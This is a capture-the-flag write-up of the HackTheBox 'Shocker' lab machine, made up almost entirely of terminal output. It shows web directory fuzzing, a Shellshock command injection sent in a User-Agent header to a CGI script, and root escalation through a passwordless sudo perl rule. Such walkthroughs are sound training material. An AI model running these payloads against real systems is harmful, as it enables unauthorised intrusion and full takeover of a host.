---
layout: single
title:  Shocker
excerpt: "
Plataforma : HackTheBox  
Sistema Operativo : Linux  
Dificultad . Fácil  
"
date: 2021-07-20
classes: wide
header:
    teaser: /assets/images/que-es-un-socket-y-como-funciona/portada.png
    teaser_home_page: true
categories:
    - WriteUp
tags:
    - Linux
    - HTB
---

```bash
   ~/boxes/HACKTHEBOX/shocker/temp2 ❯ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.56/FUZZ -c -t 200
                                                                                                                          
        /'___\  /'___\           /'___\                                                                                   
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                   
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                  
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                      
         \ \_\   \ \_\  \ \____/  \ \_\                                                       
          \/_/    \/_/   \/___/    \/_/                                                                                   

       v1.3.0 Kali Exclusive <3
________________________________________________                              
                                                                                              
 :: Method           : GET                                                                    
 :: URL              : http://10.10.10.56/FUZZ                                                                            
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt                           
 :: Follow redirects : false                                                                  
 :: Calibration      : false                                                                  
 :: Timeout          : 10                                                                                                 
 :: Threads          : 200                                                                    
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405                 
________________________________________________                                    
                                                                                              
                        [Status: 200, Size: 137, Words: 9, Lines: 10]                   
.hta                    [Status: 403, Size: 290, Words: 22, Lines: 12]
.htaccess               [Status: 403, Size: 295, Words: 22, Lines: 12]                                                    
.htpasswd               [Status: 403, Size: 295, Words: 22, Lines: 12]                        
cgi-bin/                [Status: 403, Size: 294, Words: 22, Lines: 12]                        
index.html              [Status: 200, Size: 137, Words: 9, Lines: 10]                                                     
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]                                                    
:: Progress: [4615/4615] :: Job [1/1] :: 597 req/sec :: Duration: [0:00:04] :: Errors: 0 ::   

```

```
   ~/boxes/HACKTHEBOX/shocker/temp2 ❯ gobuster dir -q -e -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,py,pl,cgi -t 200 
http://10.10.10.56/cgi-bin/.htpasswd (Status: 403)
http://10.10.10.56/cgi-bin/.htpasswd.sh (Status: 403)
http://10.10.10.56/cgi-bin/.htaccess (Status: 403)
http://10.10.10.56/cgi-bin/.htaccess.sh (Status: 403)
http://10.10.10.56/cgi-bin/.htaccess.py (Status: 403)
http://10.10.10.56/cgi-bin/.htaccess.pl (Status: 403)
http://10.10.10.56/cgi-bin/.htaccess.cgi (Status: 403)
http://10.10.10.56/cgi-bin/.htpasswd.py (Status: 403)
http://10.10.10.56/cgi-bin/.htpasswd.pl (Status: 403)
http://10.10.10.56/cgi-bin/.htpasswd.cgi (Status: 403)
http://10.10.10.56/cgi-bin/.hta (Status: 403)
http://10.10.10.56/cgi-bin/.hta.sh (Status: 403)
http://10.10.10.56/cgi-bin/.hta.py (Status: 403)
http://10.10.10.56/cgi-bin/.hta.pl (Status: 403)
http://10.10.10.56/cgi-bin/.hta.cgi (Status: 403)
http://10.10.10.56/cgi-bin/user.sh (Status: 200)


$ curl http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 18:20:37 up 22 min,  0 users,  load average: 0.00, 0.00, 0.00


$ curl -H "user-agent: () { :; }; echo;echo; /bin/bash -c 'id'" http://10.10.10.56/cgi-bin/user.sh

uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)


$ python3 -c "import pty;pty.spawn('/bin/bash')"
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
# id
id
uid=0(root) gid=0(root) groups=0(root)

```
